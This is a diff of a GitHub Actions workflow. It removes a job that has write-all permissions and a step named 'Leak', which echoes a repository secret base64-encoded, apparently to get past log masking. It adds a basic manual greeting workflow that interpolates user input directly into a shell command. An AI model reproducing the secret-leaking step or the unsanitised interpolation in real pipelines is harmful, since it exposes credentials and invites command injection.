@@ -1,17 +1,18 @@
-name: Workflow Trigger
+  name: Manual workflow
 
-on:
-  workflow_run:
-    workflows: [Create and Push Branch, Then Make PR]
+  on:
+    workflow_dispatch:
+      inputs:
+        name:
+          # Friendly description to show in the UI instead of 'name'
+          description: 'Person to greet'
+          required: true
+          default: 'World'
 
-permissions: 
-  write-all
+  jobs:
+    greet:
+      runs-on: ubuntu-latest
 
-jobs:
-  create-push-pr:
-    runs-on: ubuntu-latest
-
-    steps:
-      - name: Leak
-        run: |
-          echo ${{ secrets.SUPER_SECRET }} | base64 -w0
+      steps:
+        - name: Send greeting
+          run: echo "Hello ${{ inputs.name }}"
